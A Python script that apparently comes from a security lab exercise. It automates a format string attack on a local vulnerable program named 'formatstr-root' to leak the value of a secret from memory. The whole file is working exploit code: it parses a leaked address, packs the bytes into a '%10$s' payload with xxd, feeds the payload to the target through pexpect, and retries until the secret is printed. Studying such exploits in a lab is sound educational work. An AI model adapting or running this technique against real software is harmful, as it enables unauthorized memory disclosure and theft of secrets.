# This script uses a format string exploit to acquire the secret data
# from the formatr-root.c code. This version uses the linux terminal 
# to hex-encode the required values.
# --------------------------------------------------------------------
# 
# The script will execute a format string attack on 'targetfile' to 
# find the value of secret[1] with ASLR turned on or off. In some cases
# the secret's memory address can end up in an unreachable location due
# to control characters. In this case use malloc() in the vulnerable
# program to move the location of the secret to a different point. 


from __future__ import print_function

import os
import struct
import pexpect

targetfile = './formatstr-root'

echo = '' # Return from code
results_List = [] # List of returned results
hex_List = [] # List of hex values to be converted to chr
counter = 0 # Tally counter of runs 

# Iterate through formatstr-root 'counter' times.
while (counter <= 50):
	p = pexpect.spawn(targetfile)
	inpStr = 'NO INPUT DETECTED' # Empty input string to be built

	# Echo initial output
	for i in range(0,5):
		echo = p.readline()
		# Grab memory location of secret[1]
		if (i == 3): # 3 gives secret[1]
			sec_Loc = echo[25:33]
	# Format memory location to repace spaces with 0's
	sec_Loc = sec_Loc.replace(' ','0')

	# Split into bytes and reverse characters
	sec_Mem = [sec_Loc[6:], sec_Loc[4:6], sec_Loc[2:4], sec_Loc[:2]];

	# Create file of hex values to be encoded
	hexout = (sec_Mem[0] + ' ' + sec_Mem[1] + ' ' + sec_Mem[2] + ' ' + sec_Mem[3])
	hex_List.append(hexout)

	# Encode values using linux terminal 
	os.system('echo ' + hexout + ' | xxd -p -r > input')
	os.system('echo "%10\$s" >> input')
	fr = open('input','r')
	inpStr = fr.read()
	fr.close()
	p.sendline(inpStr)
	# Read results
	for i in range(0,5):
        	echop = p.readline()
		if i == 2:
			outStr = echop
	p.close()
	fw = open('temp','w+')
	fw.write(outStr)
	fw.close()
	if len(outStr) == 7:
		os.system('xxd -p temp > result')
		fr = open('result','r')
		outHex = fr.read()
		fr.close()
		print('Success! The secret is 0x' + outHex[8:10])
		os.system('rm result')
		break
	else:
		print('Attempt failed due to invalid hex chars in memory address. Retrying (' + str(counter) + ' of 50)')
	counter += 1

# Report error on too many failed attempts
if counter > 50:
	print('> Program aborted due to too many failed attempts')
	print('> The address of the secrets may be in a bad memory location and/or ASLR may be turned off...')
	print('> Try recompiling formatstring.c after using malloc() to move the secret.') 
	print('> WARNING: If you do this and change the executable name then you will need to\nupdate the \'targetfile\' variable at the top of formatstr.py!')
	print('> CURRENT SECRET MEMORY ADDRESS: ' + sec_Loc)
# Tidy temporary files
os.system('rm temp')
os.system('rm input')
